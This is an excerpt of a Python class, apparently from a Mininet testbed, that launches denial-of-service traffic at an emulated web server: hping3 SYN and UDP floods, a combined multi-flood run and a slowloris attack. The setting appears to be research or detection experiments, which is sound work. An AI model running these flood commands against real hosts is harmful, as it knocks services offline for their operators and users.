...
class AttackScenarios:
    ...
    def _run_command(self, command):
        """Serialize access to the Mininet host shell."""
        lock = getattr(self.attacker_host, '_experiment_cmd_lock', None)
        if lock is None:
            lock = threading.Lock()
            self.attacker_host._experiment_cmd_lock = lock
        with lock:
            return self.attacker_host.cmd(command)
    ...
    def syn_flood_attack(self, target_ip, duration=30, intensity='high'):
        ...
        if intensity == 'high':
            cmd = f"hping3 -S --flood -p 80 {target_ip}"
            rate = "High (unlimited)"
        ...
        print(f"   Rate: {rate}")
        self._run_command(f'timeout {duration} {cmd}')
    ...
    def udp_flood_attack(self, target_ip, duration=30, intensity='high'):
        ...
        if intensity == 'high':
            cmd = f"hping3 --udp --flood -p 53 {target_ip}"
        else:
    ...
    def mixed_ddos_attack(self, target_ip, duration=30):
        ...
        command = ' & '.join(f'timeout {duration} {attack}' for attack in attacks)
        self._run_command(f'{command} & wait')
    ...
    def slowloris_attack(self, target_ip, duration=30):
        ...
        """
        self._run_command(f"timeout {duration} bash -c '{script}'")
...
def example_usage():
    ...
    try:
        ...
        # Run attacks
        target = '10.0.0.11'  # WEB server (h11)
